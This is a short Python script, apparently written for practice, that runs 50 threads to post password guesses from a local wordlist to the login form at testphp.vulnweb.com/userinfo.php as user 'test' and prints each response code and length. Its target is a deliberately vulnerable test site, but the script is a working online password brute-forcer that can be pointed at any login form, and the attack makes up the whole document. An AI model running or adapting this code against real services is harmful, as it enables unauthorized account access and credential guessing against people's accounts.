import urllib.request as urllib_req
import urllib.error as err
import threading
import queue
import urllib.parse as urllib_parse
import logging

threads = 50
target_url = "http://testphp.vulnweb.com/userinfo.php"
wordlist_file = r"C:\Users\PC\OneDrive\Máy tính\Python (1).txt"  # from SVNDigger
resume = None
user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101Firefox/19.0"





def build_wordlist(wordlist_file):
    # Read in the word list
    with open(wordlist_file, "r") as fd:
        raw_words = fd.readlines()
    
    found_resume = False
    words = queue.Queue()
    
    for word in raw_words:
        word = word.strip()
        
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print(f"Resuming wordlist from: {resume}")
        else:
            words.put(word)
    
    return words


def dir_bruter(word_queue):
    while not word_queue.empty():
        passwords=word_queue.get()
        listpass=[]
        listpass.append(passwords)
        for password in listpass:
            try:
                headers={"User-agent" : user_agent}
                body=f"uname=test&pass={password}".encode("utf-8")
                resq=urllib_req.Request(target_url,data=body,headers=headers)
                with urllib_req.urlopen(resq) as resp:
                     data=resp.read()
                     if data:
                         print(f"{resp.code}  and  {password}  =>>>    {len(data)}")
            except err.URLError as e:
                print(e.code)



# Exampl
if __name__ == "__main__":
    words_queue = build_wordlist(wordlist_file)

    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=dir_bruter, args=(words_queue,))
        t.start()
        threads_list.append(t)

    for t in threads_list:
        t.join()
